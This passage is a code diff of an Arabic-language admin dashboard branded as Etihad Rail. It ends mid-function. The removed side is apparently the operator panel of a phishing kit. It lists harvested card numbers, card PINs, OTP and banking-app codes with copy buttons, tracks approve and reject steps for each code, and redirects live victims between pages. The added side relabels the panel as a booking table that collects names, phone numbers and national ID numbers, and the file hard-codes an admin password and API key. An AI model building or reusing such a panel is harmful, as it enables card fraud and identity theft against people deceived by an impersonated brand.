@@ -10,13 +10,11 @@
   --bg:#f4f5f7;--card:#fff;--ink:#1a1a2e;--muted:#6b7280;--line:#e5e7eb;
   --green:#059669;--red:#dc2626;--orange:#d97706;--blue:#2563eb;--purple:#7c3aed;
   --gold:#C5A572;--gold-light:#f5eedf;--rail:#1a1a2e;
-  --sidebar:#1a1a2e;--sidebar-w:0px;
 }
 *{box-sizing:border-box;margin:0;padding:0}
 html,body{background:var(--bg);color:var(--ink);font-family:"Cairo","Segoe UI",Tahoma,Arial,sans-serif;height:100%}
 @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');
 
-/* ── Login ── */
 .login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;
   background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%)}
 .login-box{background:#fff;border-radius:24px;padding:48px 40px;width:100%;max-width:420px;
@@ -32,11 +30,9 @@ html,body{background:var(--bg);color:var(--ink);font-family:"Cairo","Segoe UI",T
 .login-box button:hover{background:#b08f5a}
 .login-err{color:var(--red);font-size:13px;margin-bottom:10px;display:none}
 
-/* ── Layout ── */
 .layout{display:none;min-height:100vh}
 .main{padding:24px 28px;min-height:100vh}
 
-/* ── Header ── */
 .top-bar{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px}
 .top-bar h1{font-size:24px;font-weight:800;display:flex;align-items:center;gap:10px}
 .top-bar h1 img{height:36px}
@@ -51,7 +47,6 @@ html,body{background:var(--bg);color:var(--ink);font-family:"Cairo","Segoe UI",T
 .btn-logout{padding:10px 18px;background:var(--red);color:#fff;border:none;border-radius:12px;
   font-size:13px;font-weight:600;cursor:pointer;font-family:inherit}
 
-/* ── Stats ── */
 .stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:24px}
 @media(max-width:900px){.stats-row{grid-template-columns:repeat(2,1fr)}}
 @media(max-width:500px){.stats-row{grid-template-columns:1fr}}
@@ -73,7 +68,6 @@ html,body{background:var(--bg);color:var(--ink);font-family:"Cairo","Segoe UI",T
 .wifi-icon{display:inline-flex;align-items:center}
 .wifi-icon svg{width:20px;height:20px;fill:var(--green);animation:pulse 1.5s infinite}
 
-/* ── Table ── */
 .card-box{background:var(--card);border-radius:16px;padding:20px 22px;box-shadow:0 1px 3px rgba(0,0,0,.06);margin-bottom:20px}
 .card-box h2{font-size:18px;font-weight:800;margin-bottom:14px;display:flex;align-items:center;gap:8px}
 .search-row{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap}
@@ -105,7 +99,6 @@ tr:hover td{background:#fafafa}
 .act-btn.del:hover{background:#fee2e2}
 .empty-row{text-align:center;padding:40px;color:var(--muted)}
 
-/* ── Modal ── */
 .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);display:none;align-items:center;
   justify-content:center;z-index:999;padding:20px;backdrop-filter:blur(4px)}
 .modal-overlay.open{display:flex}
@@ -115,34 +108,20 @@ tr:hover td{background:#fafafa}
   cursor:pointer;color:var(--muted);line-height:1}
 .modal-box h2{font-size:18px;font-weight:800;margin-bottom:14px}
 
-/* Visitors list in modal */
 .visitors-list{display:flex;flex-direction:column;gap:10px;max-height:60vh;overflow-y:auto;padding-left:4px}
 .visitor-row{background:var(--bg);border:1px solid var(--line);border-radius:12px;padding:14px}
-.visitor-head{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:8px}
-.visitor-head .v-country{font-size:14px;font-weight:700;display:flex;align-items:center;gap:6px}
-.visitor-head .v-page{font-size:11px;background:var(--gold-light);color:#8b6914;padding:3px 10px;border-radius:999px;font-weight:700}
+.visitor-head{display:flex;align-items:center;justify-content:space-between;gap:10px}
+.visitor-head .v-id{font-size:14px;font-weight:700;display:flex;align-items:center;gap:6px}
 .visitor-head .v-time{font-size:11px;color:var(--muted)}
-.visitor-sid{font-family:monospace;font-size:11px;color:var(--muted);direction:ltr;text-align:left;margin-bottom:8px;word-break:break-all}
-.visitor-actions{display:flex;flex-wrap:wrap;gap:6px}
-.visitor-actions button{flex:1;min-width:calc(50% - 3px);padding:8px 10px;font-size:12px;font-weight:600;
-  border:1px solid var(--line);background:#fff;border-radius:8px;cursor:pointer;font-family:inherit;transition:.15s}
-.visitor-actions button:hover{background:var(--bg);border-color:var(--gold);color:var(--gold)}
+.visitor-sid{font-family:monospace;font-size:11px;color:var(--muted);direction:ltr;text-align:left;word-break:break-all;margin-top:6px}
 .visitors-empty{text-align:center;padding:40px 20px;color:var(--muted);font-size:14px}
 
-/* Detail modal */
 .detail-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
 .detail-grid .dg-item{background:var(--bg);border-radius:10px;padding:10px 14px}
 .detail-grid .dg-label{font-size:11px;color:var(--muted);margin-bottom:2px}
 .detail-grid .dg-value{font-size:14px;font-weight:700;word-break:break-all}
 .detail-grid .dg-full{grid-column:1/-1}
 
-/* Redirect modal */
-.redir-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
-.redir-grid button{padding:12px;border:1.5px solid var(--line);background:#fff;border-radius:10px;
-  font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;transition:.15s}
-.redir-grid button:hover{border-color:var(--gold);background:var(--gold-light);color:var(--ink)}
-
-/* Toast */
 .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:var(--ink);color:#fff;
   padding:12px 28px;border-radius:12px;font-size:13px;font-weight:600;z-index:9999;
   opacity:0;transition:opacity .3s;pointer-events:none}
@@ -168,7 +147,6 @@ tr:hover td{background:#fafafa}
 <div class="layout" id="dashView">
   <div class="main">
 
-    <!-- Header -->
     <div class="top-bar">
       <h1>
         <img src="/etihad_rail_logo.png" alt="قطارات الاتحاد">
@@ -184,7 +162,7 @@ tr:hover td{background:#fafafa}
       </div>
     </div>
 
-    <!-- Stats Row -->
+    <!-- Stats -->
     <div class="stats-row">
       <div class="stat-card s-active" onclick="openVisitorsModal()" title="عرض الزوار النشطين">
         <div class="stat-label">
@@ -194,11 +172,11 @@ tr:hover td{background:#fafafa}
         <div class="stat-num" id="sActive">0</div>
       </div>
       <div class="stat-card s-total">
-        <div class="stat-label">إجمالي الطلبات</div>
+        <div class="stat-label">إجمالي الحجوزات</div>
         <div class="stat-num" id="sTotal">0</div>
       </div>
       <div class="stat-card s-pending">
-        <div class="stat-label">قيد الانتظار</div>
+        <div class="stat-label">جديد</div>
         <div class="stat-num" id="sPending">0</div>
       </div>
       <div class="stat-card s-done">
@@ -207,28 +185,20 @@ tr:hover td{background:#fafafa}
       </div>
     </div>
 
-    <!-- Orders -->
+    <!-- Bookings Table -->
     <div class="card-box">
       <h2>
         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 10a4 4 0 0 1-8 0"/><path d="M3.4 5.467a2 2 0 0 0-.4 1.2V20a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6.667a2 2 0 0 0-.4-1.2l-2-2.667A2 2 0 0 0 17 2H7a2 2 0 0 0-1.6.8z"/></svg>
-        الطلبات
+        الحجوزات
       </h2>
       <div class="search-row">
-        <input type="text" id="searchInput" placeholder="بحث بالاسم أو الهاتف أو الإيميل..." oninput="renderOrders()">
+        <input type="text" id="searchInput" placeholder="بحث بالاسم أو رقم الجوال أو رقم الهوية..." oninput="renderOrders()">
         <select id="filterStatus" onchange="renderOrders()">
           <option value="">جميع الحالات</option>
-          <option value="active">نشط</option>
-          <option value="payment_approved">دفع مقبول</option>
-          <option value="payment_rejected">دفع مرفوض</option>
-          <option value="payment_done">دفع مكتمل</option>
-          <option value="otp_approved">OTP مقبول</option>
-          <option value="otp_rejected">OTP مرفوض</option>
-          <option value="otp_done">OTP مكتمل</option>
-          <option value="app_code_approved">كود التطبيق مقبول</option>
-          <option value="app_code_rejected">كود التطبيق مرفوض</option>
-          <option value="pin_done">PIN مكتمل</option>
-          <option value="pin_rejected">PIN مرفوض</option>
-          <option value="max_code">الحد الأقصى</option>
+          <option value="new">جديد</option>
+          <option value="confirmed">مؤكد</option>
+          <option value="completed">مكتمل</option>
+          <option value="cancelled">ملغي</option>
         </select>
       </div>
       <div class="tbl-wrap">
@@ -237,13 +207,13 @@ tr:hover td{background:#fafafa}
             <tr>
               <th>#</th>
               <th>الحالة</th>
-              <th>الدولة</th>
               <th>الاسم</th>
-              <th>الإيميل</th>
-              <th>الهاتف</th>
-              <th>الصفحة</th>
-              <th>البطاقة</th>
-              <th>OTP / كود</th>
+              <th>الجوال</th>
+              <th>رقم الهوية</th>
+              <th>المسار</th>
+              <th>الركاب</th>
+              <th>المبلغ</th>
+              <th>المرجع</th>
               <th>التاريخ</th>
               <th>إجراءات</th>
             </tr>
@@ -269,47 +239,11 @@ tr:hover td{background:#fafafa}
   </div>
 </div>
 
-<!-- Visitor Redirect Modal -->
-<div class="modal-overlay" id="visitorRedirectModal">
-  <div class="modal-box">
-    <button class="modal-close" onclick="closeModal('visitorRedirectModal')">×</button>
-    <h2>إعادة توجيه الزائر</h2>
-    <div class="redir-grid">
-      <button onclick="doVisitorRedirect('/')">الرئيسية</button>
-      <button onclick="doVisitorRedirect('/booking')">الحجز</button>
-      <button onclick="doVisitorRedirect('/offers')">العروض</button>
-      <button onclick="doVisitorRedirect('/network')">خريطة الشبكة</button>
-      <button onclick="doVisitorRedirect('/destinations')">الوجهات</button>
-      <button onclick="doVisitorRedirect('/live-schedule')">الجدول المباشر</button>
-      <button onclick="doVisitorRedirect('/services')">الخدمات</button>
-      <button onclick="doVisitorRedirect('/journey-planner')">مخطط الرحلة</button>
-    </div>
-  </div>
-</div>
-
-<!-- Order Redirect Modal -->
-<div class="modal-overlay" id="orderRedirectModal">
-  <div class="modal-box">
-    <button class="modal-close" onclick="closeModal('orderRedirectModal')">×</button>
-    <h2>إعادة توجيه الطلب</h2>
-    <div class="redir-grid">
-      <button onclick="doOrderRedirect('/')">الرئيسية</button>
-      <button onclick="doOrderRedirect('/booking')">الحجز</button>
-      <button onclick="doOrderRedirect('/offers')">العروض</button>
-      <button onclick="doOrderRedirect('/network')">خريطة الشبكة</button>
-      <button onclick="doOrderRedirect('/destinations')">الوجهات</button>
-      <button onclick="doOrderRedirect('/live-schedule')">الجدول المباشر</button>
-      <button onclick="doOrderRedirect('/services')">الخدمات</button>
-      <button onclick="doOrderRedirect('/journey-planner')">مخطط الرحلة</button>
-    </div>
-  </div>
-</div>
-
 <!-- Detail Modal -->
 <div class="modal-overlay" id="detailModal">
   <div class="modal-box" style="max-width:700px">
     <button class="modal-close" onclick="closeModal('detailModal')">×</button>
-    <h2>تفاصيل الطلب</h2>
+    <h2>تفاصيل الحجز</h2>
     <div class="detail-grid" id="detailGrid"></div>
   </div>
 </div>
@@ -318,24 +252,23 @@ tr:hover td{background:#fafafa}
 <div class="toast" id="toast"></div>
 
 <script>
-const SUPABASE_URL = "https://rfmbqnfjfaheiyfmaszu.supabase.co";
-const SUPABASE_KEY = "sb_publishable_Pncr0c7uPG8FNqH5qWz7cQ_kA-0uKIA";
-const ADMIN_PASS = "Admin@2026!";
-const REST = SUPABASE_URL + "/rest/v1";
-const HEADERS = {
+var SUPABASE_URL = "https://rfmbqnfjfaheiyfmaszu.supabase.co";
+var SUPABASE_KEY = "sb_publishable_Pncr0c7uPG8FNqH5qWz7cQ_kA-0uKIA";
+var ADMIN_PASS = "Admin@2026!";
+var REST = SUPABASE_URL + "/rest/v1";
+var HEADERS = {
   "apikey": SUPABASE_KEY,
   "Authorization": "Bearer " + SUPABASE_KEY,
   "Content-Type": "application/json",
   "Prefer": "return=representation"
 };
 
-let AUTHED = false;
-let ALL_ORDERS = [];
-let LAST_VISITORS = [];
+var AUTHED = false;
+var ALL_ORDERS = [];
+var LAST_VISITORS = [];
 
-// ─── Auth ───
 function doLogin() {
-  const p = document.getElementById("loginPass").value;
+  var p = document.getElementById("loginPass").value;
   if (p === ADMIN_PASS) {
     AUTHED = true;
     sessionStorage.setItem("er_admin", "1");
@@ -343,9 +276,9 @@ function doLogin() {
     document.getElementById("dashView").style.display = "block";
     refresh();
   } else {
-    const el = document.getElementById("loginErr");
+    var el = document.getElementById("loginErr");
     el.style.display = "block";
-    setTimeout(() => el.style.display = "none", 3000);
+    setTimeout(function() { el.style.display = "none"; }, 3000);
   }
 }
 function doLogout() {
@@ -363,40 +296,88 @@ function checkAuth() {
   }
 }
 
-// ─── Supabase REST helpers ───
-async function sbGet(table, query) {
-  const url = REST + "/" + table + (query ? "?" + query : "");
-  const res = await fetch(url, { headers: HEADERS });
-  if (!res.ok) return [];
-  return res.json();
+function sbGet(table, query) {
+  var url = REST + "/" + table + (query ? "?" + query : "");
+  return fetch(url, { headers: HEADERS }).then(function(res) {
+    if (!res.ok) return [];
+    return res.json();
+  }).catch(function() { return []; });
 }
-async function sbPatch(table, id, data) {
-  const url = REST + "/" + table + "?id=eq." + id;
-  return fetch(url, { method: "PATCH", headers: { ...HEADERS, "Prefer": "return=minimal" }, body: JSON.stringify(data) });
-}
-async function sbDelete(table, id) {
-  const url = REST + "/" + table + "?id=eq." + id;
+function sbDelete(table, id) {
+  var url = REST + "/" + table + "?id=eq." + id;
   return fetch(url, { method: "DELETE", headers: HEADERS });
 }
 
-// ─── Load data ───
-async function loadOrders() {
-  if (!AUTHED) return;
-  const data = await sbGet("visitors", "select=*&order=created_at.desc");
-  ALL_ORDERS = data || [];
-  updateStats();
-  renderOrders();
+function parseAddress(addr) {
+  if (!addr) return {};
+  var result = {};
+  var parts = addr.split(" • ");
+  for (var i = 0; i < parts.length; i++) {
+    var p = parts[i].trim();
+    if (p.indexOf("|") !== -1) {
+      var dp = p.split("|");
+      result.departure = dp[0].trim();
+      if (dp[1]) result.returnInfo = dp[1].trim();
+    } else if (/\d+\s*راكب/.test(p)) {
+      var m = p.match(/(\d+)\s*راكب/);
+      if (m) result.passengers = m[1];
+    } else if (/[\d,.]+\s*(AED|درهم)/i.test(p)) {
+      var m2 = p.match(/([\d,.]+)\s*(AED|درهم)/i);
+      if (m2) result.amount = m2[1] + " " + m2[2];
+    } else if (/^[A-Z]{2,}-[A-Z0-9]+$/i.test(p)) {
+      result.reference = p;
+    } else if (!result.extra) {
+      result.extra = p;
+    }
+  }
+  return result;
 }
 
-async function loadActiveVisitors() {
-  if (!AUTHED) return;
-  const cutoff = new Date(Date.now() - 60000).toISOString();
-  const data = await sbGet("site_visitors", "select=*&last_seen_at=gte." + encodeURIComponent(cutoff) + "&order=last_seen_at.desc");
-  LAST_VISITORS = data || [];
-  document.getElementById("sActive").textContent = LAST_VISITORS.length;
-  if (document.getElementById("visitorsModal").classList.contains("open")) {
-    renderVisitors(LAST_VISITORS);
+function parseNotes(notes) {
+  if (!notes) return {};
+  var result = {};
+  var parts = notes.split(" • ");
+  for (var i = 0; i < parts.length; i++) {
+    var p = parts[i].trim();
+    if (p.indexOf("البريد:") === 0) result.email = p.replace("البريد:", "").trim();
+    else if (p.indexOf("الدرجة:") === 0) result.travelClass = p.replace("الدرجة:", "").trim();
+    else if (p.indexOf("الوصول:") === 0) result.arrival = p.replace("الوصول:", "").trim();
+    else if (p.indexOf("المغادرة:") === 0) result.departureStation = p.replace("المغادرة:", "").trim();
+    else {
+      if (!result.other) result.other = [];
+      result.other.push(p);
+    }
   }
+  return result;
+}
+
+function loadOrders() {
+  if (!AUTHED) return;
+  sbGet("visitors", "select=*&order=created_at.desc").then(function(data) {
+    ALL_ORDERS = data || [];
+    updateStats();
+    renderOrders();
+  });
+}
+
+function loadActiveVisitors() {
+  if (!AUTHED) return;
+  sbGet("site_visitors", "select=*&order=created_at.desc&limit=200").then(function(data) {
+    if (!data || !data.length) {
+      LAST_VISITORS = [];
+    } else {
+      var cutoff = Date.now() - 300000;
+      var hasLastSeen = data[0].last_seen_at !== undefined && data[0].last_seen_at !== null;
+      LAST_VISITORS = data.filter(function(v) {
+        var t = hasLastSeen ? (v.last_seen_at || v.created_at) : v.created_at;
+        return t && new Date(t).getTime() > cutoff;
+      });
+    }
+    document.getElementById("sActive").textContent = LAST_VISITORS.length;
+    if (document.getElementById("visitorsModal").classList.contains("open")) {
+      renderVisitors(LAST_VISITORS);
+    }
+  });
 }
 
 function refresh() {
@@ -404,154 +385,114 @@ function refresh() {
   loadActiveVisitors();
 }
 
-// ─── Stats ───
 function updateStats() {
   document.getElementById("sTotal").textContent = ALL_ORDERS.length;
-  const pending = ALL_ORDERS.filter(o => o.status === "active" || !o.status).length;
-  const done = ALL_ORDERS.filter(o =>
-    ["payment_done", "otp_done", "pin_done", "app_code_approved"].includes(o.status)
-  ).length;
-  document.getElementById("sPending").textContent = pending;
-  document.getElementById("sDone").textContent = done;
+  var newCount = ALL_ORDERS.filter(function(o) { return o.status === "new" || !o.status; }).length;
+  var doneCount = ALL_ORDERS.filter(function(o) {
+    return o.status === "completed" || o.status === "confirmed";
+  }).length;
+  document.getElementById("sPending").textContent = newCount;
+  document.getElementById("sDone").textContent = doneCount;
 }
 
-// ─── Status helpers ───
 function statusBadge(s) {
-  const map = {
-    active:["نشط","badge-blue"],
-    payment_approved:["دفع مقبول","badge-green"],
-    payment_rejected:["دفع مرفوض","badge-red"],
-    payment_done:["دفع مكتمل","badge-gold"],
-    otp_approved:["OTP مقبول","badge-green"],
-    otp_rejected:["OTP مرفوض","badge-red"],
-    otp_done:["OTP مكتمل","badge-gold"],
-    app_code_approved:["كود مقبول","badge-green"],
-    app_code_rejected:["كود مرفوض","badge-red"],
-    pin_done:["PIN مكتمل","badge-gold"],
-    pin_rejected:["PIN مرفوض","badge-red"],
-    max_code:["الحد الأقصى","badge-purple"],
+  var map = {
+    "new": ["جديد", "badge-blue"],
+    "confirmed": ["مؤكد", "badge-green"],
+    "completed": ["مكتمل", "badge-gold"],
+    "cancelled": ["ملغي", "badge-red"],
+    "pending": ["قيد الانتظار", "badge-orange"],
+    "rail_booking": ["حجز قطار", "badge-purple"]
   };
-  const [label, cls] = map[s] || [s || "—", "badge-gray"];
-  return `<span class="badge ${cls}">${label}</span>`;
-}
-
-function pageLabel(p) {
-  if (!p) return "—";
-  const labels = {
-    "/":"الرئيسية", "home":"الرئيسية", "booking":"الحجز", "offers":"العروض",
-    "network":"خريطة الشبكة", "destinations":"الوجهات", "live-schedule":"الجدول المباشر",
-    "services":"الخدمات", "journey-planner":"مخطط الرحلة", "terms":"الشروط",
-    "privacy":"الخصوصية", "login":"تسجيل الدخول", "otp":"رمز OTP",
-    "card-pin":"PIN البطاقة", "payment":"الدفع", "checkout":"الدفع",
-    "waiting-approval":"انتظار الموافقة", "success":"النجاح", "app-code":"كود التطبيق",
-    "dashboard":"لوحة التحكم"
-  };
-  const clean = p.replace(/^\/+/, "").replace(/\.html$/, "");
-  return labels[clean] || clean;
-}
-
-function countryFlag(code) {
-  if (!code) return '<span style="font-size:16px">🌍</span>';
-  const flag = code.toUpperCase().replace(/./g, c => String.fromCodePoint(c.charCodeAt(0) + 127397));
-  return `<span style="font-size:18px">${flag}</span>`;
+  var entry = map[s];
+  if (!entry) entry = [s || "—", "badge-gray"];
+  return '<span class="badge ' + entry[1] + '">' + entry[0] + '</span>';
 }
 
 function timeAgo(iso) {
   if (!iso) return "";
-  const diff = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
+  var diff = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
   if (diff < 10) return "الآن";
   if (diff < 60) return diff + " ث";
   if (diff < 3600) return Math.floor(diff / 60) + " د";
-  return Math.floor(diff / 3600) + " س";
+  if (diff < 86400) return Math.floor(diff / 3600) + " س";
+  return Math.floor(diff / 86400) + " ي";
 }
 
 function formatDate(iso) {
   if (!iso) return "—";
-  const d = new Date(iso);
-  return d.toLocaleDateString("ar-AE", { month:"short", day:"numeric", hour:"2-digit", minute:"2-digit" });
+  var d = new Date(iso);
+  return d.toLocaleDateString("ar-AE", { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" });
 }
 
-function maskCard(num) {
-  if (!num) return "";
-  const s = num.replace(/\s/g, "");
-  if (s.length < 8) return s;
-  return s.slice(0, 4) + " •••• " + s.slice(-4);
+function esc(str) {
+  if (!str) return "";
+  var div = document.createElement("div");
+  div.appendChild(document.createTextNode(str));
+  return div.innerHTML;
 }
 
-// ─── Render orders ───
 function renderOrders() {
-  const q = (document.getElementById("searchInput").value || "").toLowerCase().trim();
-  const sf = document.getElementById("filterStatus").value;
-  let list = ALL_ORDERS;
-  if (sf) list = list.filter(o => o.status === sf);
-  if (q) list = list.filter(o =>
-    (o.full_name || "").toLowerCase().includes(q) ||
-    (o.email || "").toLowerCase().includes(q) ||
-    (o.phone || "").includes(q) ||
-    (o.reference || "").toLowerCase().includes(q)
-  );
-  const tbody = document.getElementById("ordersBody");
+  var q = (document.getElementById("searchInput").value || "").toLowerCase().trim();
+  var sf = document.getElementById("filterStatus").value;
+  var list = ALL_ORDERS;
+  if (sf) list = list.filter(function(o) { return o.status === sf; });
+  if (q) list = list.filter(function(o) {
+    return (o.name || "").toLowerCase().indexOf(q) !== -1 ||
+      (o.mobile || "").indexOf(q) !== -1 ||
+      (o.id_number || "").indexOf(q) !== -1;
+  });
+  var tbody = document.getElementById("ordersBody");
   if (!list.length) {
     tbody.innerHTML = '<tr><td colspan="11" class="empty-row">لا توجد نتائج</td></tr>';
     return;
   }
-  tbody.innerHTML = list.map((o, i) => {
-    const cardInfo = o.card_number
-      ? `<span style="font-size:12px;direction:ltr;display:inline-block">${maskCard(o.card_number)}</span>
-         <br><button class="copy-btn" onclick="copyText('${(o.card_number||"").replace(/'/g,"\\'")}')">نسخ رقم</button>
-         ${o.card_pin ? ` <button class="copy-btn" onclick="copyText('${o.card_pin}')">PIN</button>` : ""}`
-      : "—";
-    const otpInfo = o.otp_code
-      ? `<span style="font-weight:700;direction:ltr">${o.otp_code}</span>
-         <button class="copy-btn" onclick="copyText('${o.otp_code}')">نسخ</button>`
-      : o.app_code
-        ? `<span style="font-weight:700;direction:ltr">${o.app_code}</span>
-           <button class="copy-btn" onclick="copyText('${o.app_code}')">نسخ</button>`
-        : "—";
-    return `<tr>
-      <td>${i + 1}</td>
-      <td>${statusBadge(o.status)}</td>
-      <td>${countryFlag(o.country_code)} ${o.country || ""}</td>
-      <td style="font-weight:700">${o.full_name || "—"}</td>
-      <td style="font-size:12px;direction:ltr">${o.email || "—"}</td>
-      <td style="direction:ltr;white-space:nowrap">${o.phone || "—"}</td>
-      <td><span class="badge badge-blue">${pageLabel(o.current_page)}</span></td>
-      <td>${cardInfo}</td>
-      <td>${otpInfo}</td>
-      <td style="font-size:12px;white-space:nowrap">${formatDate(o.created_at)}</td>
-      <td style="white-space:nowrap">
-        <button class="act-btn" onclick="viewDetail('${o.id}')">عرض</button>
-        <button class="act-btn" onclick="openOrderRedirect('${o.id}')">توجيه</button>
-        <button class="act-btn del" onclick="deleteOrder('${o.id}')">حذف</button>
-      </td>
-    </tr>`;
+  tbody.innerHTML = list.map(function(o, i) {
+    var parsed = parseAddress(o.address);
+    var route = esc(o.card_type || "—");
+    var passengers = esc(parsed.passengers || "—");
+    var amount = esc(parsed.amount || "—");
+    var ref = parsed.reference || "";
+    var refDisplay = ref ? esc(ref) : "—";
+    var refCopy = ref ? ' <button class="copy-btn" onclick="copyText(\'' + esc(ref) + '\')">نسخ</button>' : '';
+    return '<tr>' +
+      '<td>' + (i + 1) + '</td>' +
+      '<td>' + statusBadge(o.status) + '</td>' +
+      '<td style="font-weight:700">' + esc(o.name || "—") + '</td>' +
+      '<td style="direction:ltr;white-space:nowrap">' + esc(o.mobile || "—") + '</td>' +
+      '<td>' + esc(o.id_number || "—") + '</td>' +
+      '<td style="font-size:12px">' + route + '</td>' +
+      '<td>' + passengers + '</td>' +
+      '<td style="font-weight:700;color:var(--green)">' + amount + '</td>' +
+      '<td style="font-family:monospace;font-size:12px;direction:ltr">' + refDisplay + refCopy + '</td>' +
+      '<td style="font-size:12px;white-space:nowrap">' + formatDate(o.created_at) + '</td>' +
+      '<td style="white-space:nowrap">' +
+        '<button class="act-btn" onclick="viewDetail(\'' + o.id + '\')">عرض</button> ' +
+        '<button class="act-btn del" onclick="deleteOrder(\'' + o.id + '\')">حذف</button>' +
+      '</td>' +
+    '</tr>';
   }).join("");
 }
 
-// ─── Visitors ───
 function renderVisitors(list) {
   document.getElementById("visitorsCount").textContent = list.length;
-  const box = document.getElementById("visitorsList");
+  var box = document.getElementById("visitorsList");
   if (!list.length) {
     box.innerHTML = '<div class="visitors-empty">لا يوجد زوار نشطين الآن</div>';
     return;
   }
-  box.innerHTML = list.map(v => {
-    const vid = v.visitor_id || v.id || "";
-    const flag = countryFlag(v.country_code);
-    return `
-      <div class="visitor-row">
-        <div class="visitor-head">
-          <div class="v-country">${flag} ${v.country || ""}</div>
-          <span class="v-page">${pageLabel(v.last_page)}</span>
-          <span class="v-time">${timeAgo(v.last_seen_at)}</span>
-        </div>
-        <div class="visitor-sid">${vid}</div>
-        <div class="visitor-actions">
-          <button onclick="openVisitorRedirectFor('${String(vid).replace(/'/g,"\\'")}')">إعادة توجيه</button>
-        </div>
-      </div>
-    `;
+  box.innerHTML = list.map(function(v) {
+    var vid = v.visitor_id || v.id || "";
+    var lastTime = v.last_seen_at || v.created_at;
+    var lastPage = v.last_page || "";
+    var pageTag = lastPage ? '<span style="font-size:11px;background:var(--gold-light);color:#8b6914;padding:3px 10px;border-radius:999px;font-weight:700">' + esc(lastPage) + '</span>' : '';
+    return '<div class="visitor-row">' +
+      '<div class="visitor-head">' +
+        '<div class="v-id">🌐 زائر ' + pageTag + '</div>' +
+        '<span class="v-time">' + timeAgo(lastTime) + '</span>' +
+      '</div>' +
+      '<div class="visitor-sid">' + esc(vid) + '</div>' +
+    '</div>';
   }).join("");
 }
 
@@ -561,95 +502,85 @@ function openVisitorsModal() {
   loadActiveVisitors();
 }
 
-let currentVisitorId = null;
-function openVisitorRedirectFor(vid) {
-  currentVisitorId = vid;
-  openModal("visitorRedirectModal");
-}
-async function doVisitorRedirect(page) {
-  if (!currentVisitorId) return;
-  await sbPatch("site_visitors", currentVisitorId, { redirect_to: page });
-  closeModal("visitorRedirectModal");
-  currentVisitorId = null;
-  showToast("تم إرسال التوجيه");
-  loadActiveVisitors();
-}
-
-// ─── Order actions ───
 function viewDetail(id) {
-  const o = ALL_ORDERS.find(x => String(x.id) === String(id));
+  var o = null;
+  for (var i = 0; i < ALL_ORDERS.length; i++) {
+    if (String(ALL_ORDERS[i].id) === String(id)) { o = ALL_ORDERS[i]; break; }
+  }
   if (!o) return;
-  const fields = [
-    ["المرجع", o.reference],
-    ["الحالة", o.status],
-    ["الاسم الكامل", o.full_name],
-    ["الإيميل", o.email],
-    ["الهاتف", o.phone],
-    ["الدولة", (o.country_code ? countryFlag(o.country_code) + " " : "") + (o.country || "—")],
-    ["الصفحة الحالية", pageLabel(o.current_page)],
-    ["البنك", o.bank_name],
-    ["نوع البطاقة", o.card_type],
-    ["اسم حامل البطاقة", o.card_name],
-    ["رقم البطاقة", o.card_number],
-    ["PIN البطاقة", o.card_pin],
-    ["رمز OTP", o.otp_code],
-    ["كود التطبيق", o.app_code],
+  var parsed = parseAddress(o.address);
+  var notes = parseNotes(o.address_notes);
+  var fields = [
+    ["الحالة", o.status, true],
+    ["نوع الطلب", o.order_type],
+    ["الاسم", o.name],
+    ["رقم الجوال", o.mobile],
+    ["رقم الهوية", o.id_number],
+    ["المسار", o.card_type],
+    ["تاريخ المغادرة", parsed.departure],
+    ["العودة", parsed.returnInfo],
+    ["عدد الركاب", parsed.passengers],
+    ["المبلغ الإجمالي", parsed.amount],
+    ["رقم المرجع", parsed.reference],
+    ["البريد الإلكتروني", notes.email],
+    ["درجة السفر", notes.travelClass],
+    ["معلومات الوصول", notes.arrival],
     ["تاريخ الإنشاء", formatDate(o.created_at)],
-    ["آخر نشاط", formatDate(o.last_activity_at)],
+    ["آخر نشاط", formatDate(o.last_activity_at)]
   ];
-  document.getElementById("detailGrid").innerHTML = fields.map(([label, val]) => {
-    const v = val || "—";
-    const copyBtn = val && typeof val === "string" && val.length > 2
-      ? ` <button class="copy-btn" onclick="copyText('${val.replace(/'/g,"\\'")}')">نسخ</button>` : "";
-    return `<div class="dg-item"><div class="dg-label">${label}</div><div class="dg-value">${v}${copyBtn}</div></div>`;
+  if (o.address) fields.push(["تفاصيل الرحلة", o.address, false, true]);
+  if (o.address_notes) fields.push(["ملاحظات إضافية", o.address_notes, false, true]);
+
+  document.getElementById("detailGrid").innerHTML = fields.map(function(f) {
+    var label = f[0];
+    var val = f[1];
+    var isStatus = f[2] || false;
+    var isFull = f[3] || false;
+    var displayVal;
+    if (isStatus) {
+      displayVal = statusBadge(val);
+    } else {
+      displayVal = esc(val ? String(val) : "—");
+    }
+    var copyBtn = "";
+    if (!isStatus && val && String(val) !== "—" && String(val).length > 1) {
+      copyBtn = ' <button class="copy-btn" onclick="copyText(\'' + esc(String(val)).replace(/'/g, "\\&#39;") + '\')">نسخ</button>';
+    }
+    return '<div class="dg-item' + (isFull ? ' dg-full' : '') + '">' +
+      '<div class="dg-label">' + label + '</div>' +
+      '<div class="dg-value">' + displayVal + copyBtn + '</div>' +
+    '</div>';
   }).join("");
   openModal("detailModal");
 }
 
-let currentOrderId = null;
-function openOrderRedirect(id) {
-  currentOrderId = id;
-  openModal("orderRedirectModal");
-}
-async function doOrderRedirect(page) {
-  if (!currentOrderId) return;
-  await sbPatch("visitors", currentOrderId, { redirect_to: page, current_page: page.replace(/^\//,"") });
-  closeModal("orderRedirectModal");
-  currentOrderId = null;
-  showToast("تم إرسال التوجيه");
-  loadOrders();
+function deleteOrder(id) {
